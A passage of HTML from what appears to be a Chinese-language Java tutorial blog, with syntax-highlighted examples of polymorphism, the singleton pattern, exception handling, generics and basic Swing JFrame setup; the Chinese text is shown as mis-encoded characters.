class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeSound</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åŠ¨ç‰©å‘å‡ºå£°éŸ³&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeSound</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ±ªæ±ªæ±ª&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">guard</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ç‹—ç‹—åœ¨çœ‹å®¶&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeSound</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å–µå–µå–µ&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">catchMouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;çŒ«åœ¨æŠ“è€é¼ &quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// å¤šæ€ï¼šçˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡</span><br>        <span class="hljs-type">Animal</span> <span class="hljs-variable">animal1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();  <span class="hljs-comment">// å‘ä¸Šè½¬å‹</span><br>        <span class="hljs-type">Animal</span> <span class="hljs-variable">animal2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br>        <br>        animal1.makeSound();  <span class="hljs-comment">// è¾“å‡ºï¼šæ±ªæ±ªæ±ªï¼ˆè¿è¡Œæ—¶å¤šæ€ï¼‰</span><br>        animal2.makeSound();  <span class="hljs-comment">// è¾“å‡ºï¼šå–µå–µå–µ</span><br>        <br>        <span class="hljs-comment">// animal1.guard();  // âŒ é”™è¯¯ï¼šAnimalç±»å‹æ²¡æœ‰guardæ–¹æ³•</span><br>        <br>        <span class="hljs-comment">// å‘ä¸‹è½¬å‹</span><br>        <span class="hljs-keyword">if</span> (animal1 <span class="hljs-keyword">instanceof</span> Dog) &#123;<br>            <span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> (Dog) animal1;  <span class="hljs-comment">// å‘ä¸‹è½¬å‹</span><br>            dog.guard();  <span class="hljs-comment">// ç°åœ¨å¯ä»¥è°ƒç”¨Dogç‰¹æœ‰çš„æ–¹æ³•</span><br>        &#125;<br>        <br>        <span class="hljs-comment">// å¤šæ€åœ¨æ•°ç»„ä¸­çš„åº”ç”¨</span><br>        Animal[] animals = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>()&#125;;<br>        <span class="hljs-keyword">for</span> (Animal animal : animals) &#123;<br>            animal.makeSound();  <span class="hljs-comment">// åŒä¸€ä¸ªæ–¹æ³•ï¼Œä¸åŒè¡¨ç°</span><br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// å¤šæ€åœ¨æ–¹æ³•å‚æ•°ä¸­çš„åº”ç”¨</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">animalShow</span><span class="hljs-params">(Animal animal)</span> &#123;<br>        animal.makeSound();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ—ï¸-2-6-è®¾è®¡æ¨¡å¼"><a href="#ğŸ—ï¸-2-6-è®¾è®¡æ¨¡å¼" class="headerlink" title="ğŸ—ï¸ 2.6 è®¾è®¡æ¨¡å¼"></a>ğŸ—ï¸ 2.6 è®¾è®¡æ¨¡å¼</h2><h3 id="é€šä¿—ç†è§£-13"><a href="#é€šä¿—ç†è§£-13" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>ç¼–ç¨‹çš„â€æ­¦åŠŸæ‹›å¼â€ï¼Œè§£å†³ç‰¹å®šé—®é¢˜çš„ç»å…¸æ–¹æ³•</p><h3 id="ä»£ç æ¼”ç¤ºï¼ˆå•ä¾‹æ¨¡å¼ï¼‰"><a href="#ä»£ç æ¼”ç¤ºï¼ˆå•ä¾‹æ¨¡å¼ï¼‰" class="headerlink" title="ä»£ç æ¼”ç¤ºï¼ˆå•ä¾‹æ¨¡å¼ï¼‰"></a>ä»£ç æ¼”ç¤ºï¼ˆå•ä¾‹æ¨¡å¼ï¼‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å•ä¾‹æ¨¡å¼ï¼šç¡®ä¿ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®ä¾‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <span class="hljs-comment">// 1. ç§æœ‰é™æ€å®ä¾‹</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;<br>    <br>    <span class="hljs-comment">// 2. ç§æœ‰æ„é€ æ–¹æ³•ï¼Œé˜²æ­¢å¤–éƒ¨new</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å•ä¾‹å¯¹è±¡åˆ›å»ºäº†&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 3. å…¬å…±é™æ€æ–¹æ³•è·å–å®ä¾‹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">showMessage</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯å•ä¾‹å¯¹è±¡&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// Singleton s1 = new Singleton();  // âŒ é”™è¯¯ï¼šæ„é€ æ–¹æ³•ç§æœ‰</span><br>        <br>        <span class="hljs-type">Singleton</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> Singleton.getInstance();<br>        <span class="hljs-type">Singleton</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> Singleton.getInstance();<br>        <br>        s1.showMessage();<br>        System.out.println(<span class="hljs-string">&quot;s1å’Œs2æ˜¯åŒä¸€ä¸ªå¯¹è±¡å—ï¼Ÿ&quot;</span> + (s1 == s2));  <span class="hljs-comment">// true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸš¨-2-7-å¼‚å¸¸å¤„ç†"><a href="#ğŸš¨-2-7-å¼‚å¸¸å¤„ç†" class="headerlink" title="ğŸš¨ 2.7 å¼‚å¸¸å¤„ç†"></a>ğŸš¨ 2.7 å¼‚å¸¸å¤„ç†</h2><h3 id="é€šä¿—ç†è§£-14"><a href="#é€šä¿—ç†è§£-14" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>ç¨‹åºè¿è¡Œæ—¶çš„â€æ„å¤–æƒ…å†µâ€ï¼Œéœ€è¦æå‰å‡†å¤‡åº”å¯¹æ–¹æ¡ˆ</p><h3 id="ä»£ç æ¼”ç¤º-13"><a href="#ä»£ç æ¼”ç¤º-13" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExceptionDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 1. try-catch å¤„ç†å¼‚å¸¸</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span> / <span class="hljs-number">0</span>;  <span class="hljs-comment">// è¿™é‡Œä¼šæŠ›å‡ºå¼‚å¸¸</span><br>            System.out.println(<span class="hljs-string">&quot;ç»“æœï¼š&quot;</span> + result);<br>        &#125; <span class="hljs-keyword">catch</span> (ArithmeticException e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;å‘ç”Ÿç®—æœ¯å¼‚å¸¸ï¼š&quot;</span> + e.getMessage());<br>        &#125;<br>        <br>        <span class="hljs-comment">// 2. å¤šä¸ªcatchå—</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            System.out.println(str.length());  <span class="hljs-comment">// ç©ºæŒ‡é’ˆå¼‚å¸¸</span><br>        &#125; <span class="hljs-keyword">catch</span> (NullPointerException e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;ç©ºæŒ‡é’ˆå¼‚å¸¸&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;å…¶ä»–å¼‚å¸¸&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">// 3. finallyï¼šæ— è®ºæ˜¯å¦å¼‚å¸¸éƒ½ä¼šæ‰§è¡Œ</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>            System.out.println(arr[<span class="hljs-number">5</span>]);  <span class="hljs-comment">// æ•°ç»„è¶Šç•Œ</span><br>        &#125; <span class="hljs-keyword">catch</span> (ArrayIndexOutOfBoundsException e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;æ•°ç»„ç´¢å¼•è¶Šç•Œ&quot;</span>);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;finallyå—æ‰§è¡Œäº†&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">// 4. æŠ›å‡ºå¼‚å¸¸</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            checkAge(<span class="hljs-number">15</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;æ•è·å¼‚å¸¸ï¼š&quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// æ–¹æ³•å£°æ˜å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (age &lt; <span class="hljs-number">18</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;å¹´é¾„ä¸èƒ½å°äº18å²&quot;</span>);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;å¹´é¾„åˆæ³•&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ“¦-3-1-æ³›å‹ç¼–ç¨‹"><a href="#ğŸ“¦-3-1-æ³›å‹ç¼–ç¨‹" class="headerlink" title="ğŸ“¦ 3.1 æ³›å‹ç¼–ç¨‹"></a>ğŸ“¦ 3.1 æ³›å‹ç¼–ç¨‹</h2><h3 id="é€šä¿—ç†è§£-15"><a href="#é€šä¿—ç†è§£-15" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>ç»™ä»£ç è´´æ ‡ç­¾ï¼Œè¯´æ˜é‡Œé¢è£…çš„æ˜¯ä»€ä¹ˆç±»å‹ï¼Œé¿å…æ”¾é”™ä¸œè¥¿</p><h3 id="ä»£ç æ¼”ç¤º-14"><a href="#ä»£ç æ¼”ç¤º-14" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ³›å‹ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;T&gt; &#123;  <span class="hljs-comment">// Tæ˜¯ç±»å‹å‚æ•°</span><br>    <span class="hljs-keyword">private</span> T content;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setContent</span><span class="hljs-params">(T content)</span> &#123;<br>        <span class="hljs-built_in">this</span>.content = content;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getContent</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> content;<br>    &#125;<br>    <br>    <span class="hljs-comment">// æ³›å‹æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> &lt;E&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">showType</span><span class="hljs-params">(E item)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ç±»å‹æ˜¯ï¼š&quot;</span> + item.getClass().getSimpleName());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºä¸åŒç±»å‹çš„ç›’å­</span><br>        Box&lt;String&gt; stringBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>&lt;&gt;();<br>        stringBox.setContent(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        <span class="hljs-comment">// stringBox.setContent(123);  // âŒ ç¼–è¯‘é”™è¯¯ï¼šç±»å‹ä¸åŒ¹é…</span><br>        <br>        Box&lt;Integer&gt; intBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>&lt;&gt;();<br>        intBox.setContent(<span class="hljs-number">100</span>);<br>        <br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> stringBox.getContent();  <span class="hljs-comment">// ä¸éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> intBox.getContent();<br>        <br>        System.out.println(<span class="hljs-string">&quot;å­—ç¬¦ä¸²å†…å®¹ï¼š&quot;</span> + str);<br>        System.out.println(<span class="hljs-string">&quot;æ•°å­—å†…å®¹ï¼š&quot;</span> + num);<br>        <br>        <span class="hljs-comment">// è°ƒç”¨æ³›å‹æ–¹æ³•</span><br>        stringBox.showType(<span class="hljs-string">&quot;æµ‹è¯•&quot;</span>);<br>        stringBox.showType(<span class="hljs-number">123</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// æ³›å‹åœ¨é›†åˆä¸­çš„åº”ç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testList</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// æ²¡æœ‰æ³›å‹æ—¶</span><br>        <span class="hljs-comment">// List list = new ArrayList();  // å¯ä»¥æ”¾ä»»ä½•ç±»å‹</span><br>        <span class="hljs-comment">// list.add(&quot;å­—ç¬¦ä¸²&quot;);</span><br>        <span class="hljs-comment">// list.add(123);</span><br>        <span class="hljs-comment">// String str = (String) list.get(1);  // è¿è¡Œæ—¶å¯èƒ½å‡ºé”™</span><br>        <br>        <span class="hljs-comment">// ä½¿ç”¨æ³›å‹</span><br>        java.util.List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.ArrayList&lt;&gt;();<br>        list.add(<span class="hljs-string">&quot;è‹¹æœ&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;é¦™è•‰&quot;</span>);<br>        <span class="hljs-comment">// list.add(123);  // âŒ ç¼–è¯‘é”™è¯¯</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> list.get(<span class="hljs-number">0</span>);  <span class="hljs-comment">// ä¸éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1. æ¦‚è¿°"></a>1. æ¦‚è¿°</h2><p>Java Swing æ˜¯ Java çš„å›¾å½¢ç”¨æˆ·ç•Œé¢å·¥å…·åŒ…ï¼Œç”¨äºåˆ›å»ºè·¨å¹³å°çš„æ¡Œé¢åº”ç”¨ç¨‹åºã€‚Swing æä¾›ä¸°å¯Œçš„ç»„ä»¶åº“ï¼Œæ”¯æŒå„ç§å¸ƒå±€ç®¡ç†å™¨å’Œäº‹ä»¶å¤„ç†æœºåˆ¶ã€‚</p><p><img src="C:\Users\a1348\AppData\Roaming\Typora\typora-user-images\image-20251120120624750.png" alt="image-20251120120624750"></p><p>JComponntæ˜¯swingç»„ä»¶å­˜æ”¾çš„ä½ç½®ï¼Œå¸¸ç”¨çš„ç»„ä»¶å¦‚ä¸‹ï¼š</p><p><img src="C:\Users\a1348\AppData\Roaming\Typora\typora-user-images\image-20251120120736430.png" alt="image-20251120120736430"></p><p><img src="C:\Users\a1348\AppData\Roaming\Typora\typora-user-images\image-20251120120749490.png" alt="image-20251120120749490"></p><h2 id="2-å¸¸ç”¨çš„çª—ä½“"><a href="#2-å¸¸ç”¨çš„çª—ä½“" class="headerlink" title="2. å¸¸ç”¨çš„çª—ä½“"></a>2. å¸¸ç”¨çš„çª—ä½“</h2><p>å¸¸ç”¨çš„çª—ä½“æœ‰ä¸¤ç§ï¼ŒJFrameå’ŒJDialog</p><h3 id="2-1-JFrame"><a href="#2-1-JFrame" class="headerlink" title="2.1 JFrame"></a>2.1 JFrame</h3><p>JFrameæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œä»–æ˜¯å„ä¸ªç»„ä»¶çš„è½½ä½“ã€‚åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ç»§æ‰¿java.swing.JFrameæ¥åˆ›å»ºè¦ç»™çª—ä½“ã€‚</p><h4 id="ä¸€-æ–°å»ºJFrameå¯¹è±¡"><a href="#ä¸€-æ–°å»ºJFrameå¯¹è±¡" class="headerlink" title="ä¸€.æ–°å»ºJFrameå¯¹è±¡"></a>ä¸€.æ–°å»ºJFrameå¯¹è±¡</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºæ— æ ‡é¢˜çª—å£</span><br><span class="hljs-type">JFrame</span> <span class="hljs-variable">frame1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>();<br><span class="hljs-comment">// åˆ›å»ºå¸¦æ ‡é¢˜çª—å£</span><br><span class="hljs-type">JFrame</span> <span class="hljs-variable">frame2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;çª—å£æ ‡é¢˜&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="äºŒ-è®¾ç½®JFrameçš„å¤§å°"><a href="#äºŒ-è®¾ç½®JFrameçš„å¤§å°" class="headerlink" title="äºŒ.è®¾ç½®JFrameçš„å¤§å°"></a>äºŒ.è®¾ç½®JFrameçš„å¤§å°</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è®¾ç½®çª—å£å¤§å°</span><br>frame.setSize(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>);   <span class="hljs-comment">//int width,int height</span><br><span class="hljs-comment">// è®¾ç½®çª—å£ä½ç½®</span><br>frame.setLocation(<span class="hljs-number">500</span>, <span class="hljs-number">200</span>);<br><span class="hljs-comment">// åŒæ—¶è®¾ç½®ä½ç½®å’Œå¤§å°</span><br>frame.setBounds(<span class="hljs-number">500</span>, <span class="hljs-number">200</span>, <span class="hljs-number">400</span>, <span class="hljs-number">300</span>);   <span class="hljs-comment">//int a,int b,int width,int height</span><br><span class="hljs-comment">// è®¾ç½®çª—å£å¯è§æ€§ï¼ˆé»˜è®¤ä¸å¯è§ï¼‰</span><br>frame.setVisible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// è®¾ç½®çª—å£æ˜¯å¦å¯è°ƒæ•´å¤§å°</span><br>frame.setResizable(<span class="hljs-literal">false</span>);<br><span class="hljs-comment">// è®¾ç½®çª—å£æœ€å¤§åŒ–çŠ¶æ€</span><br>frame.setExtendedState(JFrame.MAXIMIZED_BOTH);<br></code></pre></td></tr></table></figure><h4 id="ä¸‰-è®¾å®šJFrameçš„å…³é—­æ–¹å¼"><a href="#ä¸‰-è®¾å®šJFrameçš„å…³é—­æ–¹å¼" class="headerlink" title="ä¸‰.è®¾å®šJFrameçš„å…³é—­æ–¹å¼"></a>ä¸‰.è®¾å®šJFrameçš„å…³é—­æ–¹å¼</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è®¾ç½®å…³é—­æ“ä½œ</span><br>frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br><br><span class="hljs-comment">// å¯é€‰å…³é—­æ–¹å¼ï¼š</span><br><span class="hljs-comment">// DO_NOTHING_ON_CLOSE - ä»€ä¹ˆä¹Ÿä¸åš</span><br><span class="hljs-comment">// HIDE_ON_CLOSE - éšè—çª—å£</span><br><span class="hljs-comment">// DISPOSE_ON_CLOSE - éšè—å¹¶é‡Šæ”¾èµ„æº</span><br><span class="hljs-comment">// EXIT_ON_CLOSE - é€€å‡ºç¨‹åº</span><br></code></pre></td></tr></table></figure><p>æ€»ç»“</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> javax.<span class="hljs-property">swing</span>.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWindow</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçª—å£</span><br>        <span class="hljs-title class_">JFrame</span> jf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®çª—å£å¤§å°å’Œä½ç½®</span><br>        jf.<span class="hljs-title function_">setBounds</span>(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">400</span>, <span class="hljs-number">250</span>);<br>        <span class="hljs-comment">// æ˜¾ç¤ºçª—å£</span><br>        jf.<span class="hljs-title function_">setVisible</span>(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// è®¾ç½®å…³é—­çª—å£æ—¶é€€å‡ºç¨‹åº</span><br>        jf.<span class="hljs-title function_">setDefaultCloseOperation</span>(<span class="hljs-title class_">WindowConstants</span>.<span class="hljs-property">EXIT_ON_CLOSE</span>);     <br>    